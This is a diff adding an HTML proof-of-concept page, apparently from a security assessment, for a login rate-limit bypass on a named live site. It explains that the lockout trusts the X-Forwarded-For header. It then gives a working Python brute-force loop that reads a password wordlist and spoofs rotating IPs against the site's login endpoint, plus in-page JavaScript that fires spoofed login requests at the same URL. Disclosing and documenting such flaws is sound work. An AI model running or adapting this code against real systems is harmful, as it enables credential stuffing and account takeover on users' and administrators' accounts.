@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC: Rate Limit Bypass — alts.cool (F-096)</title>
+<style>
+  body { font-family: monospace; background: #0d1117; color: #c9d1d9;
+         max-width: 860px; margin: 40px auto; padding: 20px; }
+  h1 { color: #f85149; font-size: 1.2rem; }
+  .meta { background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+          padding: 16px; margin: 16px 0; font-size: 0.85rem; line-height: 1.6; }
+  pre { background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+        padding: 16px; overflow-x: auto; font-size: 0.82rem; line-height: 1.5; }
+  #log { background: #0d1a2e; border: 1px solid #30363d; border-radius: 6px;
+         padding: 14px; margin-top: 16px; white-space: pre-wrap; min-height: 80px;
+         max-height: 300px; overflow-y: auto; font-size: 0.8rem; }
+  button { background: #f85149; color: #fff; border: none; padding: 10px 22px;
+           border-radius: 6px; cursor: pointer; font-size: 0.9rem; margin: 6px 4px 0 0; }
+  button.green { background: #238636; }
+  .warn { color: #e3b341; font-size: 0.8rem; margin-top: 8px; }
+</style>
+</head>
+<body>
+<h1>🚨 PoC: Rate Limit Bypass via X-Forwarded-For — alts.cool Login (F-096)</h1>
+<div class="meta">
+  <strong>Finding:</strong> F-096 · Severity: CRITICAL<br>
+  <strong>Target:</strong> POST https://alts.cool/api/auth/login<br>
+  <strong>Root cause:</strong> Rate limiting trusts the <code>X-Forwarded-For</code> header for IP
+  identification. An attacker can rotate fake IPs with each request, completely bypassing the
+  3-attempt lockout.<br>
+  <strong>Impact:</strong> Unlimited brute-force attempts on any account (customer or admin).
+  Combined with the admin panel at <code>/login</code> (no CAPTCHA — F-044), this enables
+  automated credential stuffing and dictionary attacks with no effective throttle.
+</div>
+
+<p class="warn">⚠ Demo uses non-existent test credentials. Click "Run Bypass Demo" to send 10 requests
+  — the first 3 without bypass header (to show the 429), then 7 with rotating X-Forwarded-For (to show the bypass).</p>
+<button onclick="runDemo()">▶ Run Bypass Demo (10 requests)</button>
+<button class="green" onclick="clearLog()">Clear</button>
+<div id="log">Ready...</div>
+
+<h3 style="margin-top:24px;color:#8b949e;">Attacker PoC script concept</h3>
+<pre>import requests, random
+
+def rand_ip():
+    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+
+for password in open("wordlist.txt"):
+    r = requests.post("https://alts.cool/api/auth/login",
+        json={"email": "target@example.com", "password": password.strip()},
+        headers={"X-Forwarded-For": rand_ip()})
+    print(f"{r.status_code} | {r.text[:100]}")</pre>
+
+<script>
+function log(msg) {
+  const el = document.getElementById("log");
+  el.textContent += msg + "\n";
+  el.scrollTop = el.scrollHeight;
+}
+function clearLog() { document.getElementById("log").textContent = ""; }
+
+async function runDemo() {
+  clearLog();
+  log("Starting demo: 10 login attempts against alts.cool/api/auth/login\n");
+
+  for (let i = 1; i <= 10; i++) {
+    const useBypass = i > 3;
+    const fakeIp = useBypass
+      ? `${Math.floor(Math.random()*200+10)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*200+10)}`
+      : null;
+
+    const headers = {"Content-Type": "application/json"};
+    if (fakeIp) headers["X-Forwarded-For"] = fakeIp;
+
+    try {
+      const r = await fetch("https://alts.cool/api/auth/login", {
+        method: "POST",
+        headers,
+        body: JSON.stringify({email: "blockguard_poc_test@test.com", password: `wrongpass_${i}`}),
+        credentials: "include"
+      });
+      const txt = await r.text();
+      const bypass = useBypass ? ` [X-Forwarded-For: ${fakeIp}]` : " [no bypass header]";
+      const icon = r.status === 429 ? "🚫 429 BLOCKED" : (r.status === 401 ? "✅ 401 BYPASSED" : `ℹ️ ${r.status}`);
+      log(`[${i}] ${icon}${bypass}\n    Response: ${txt.slice(0,120)}`);
+    } catch(e) {
+      log(`[${i}] ERROR: ${e.message}`);
+    }
+    await new Promise(r => setTimeout(r, 300));
+  }
+  log("\n=== Summary ===");
+  log("Attempts 1-3: No bypass → 429 expected after threshold");
+  log("Attempts 4-10: X-Forwarded-For rotation → 401 (bypass confirmed)");
+}
+</script>
+</body>
+</html>
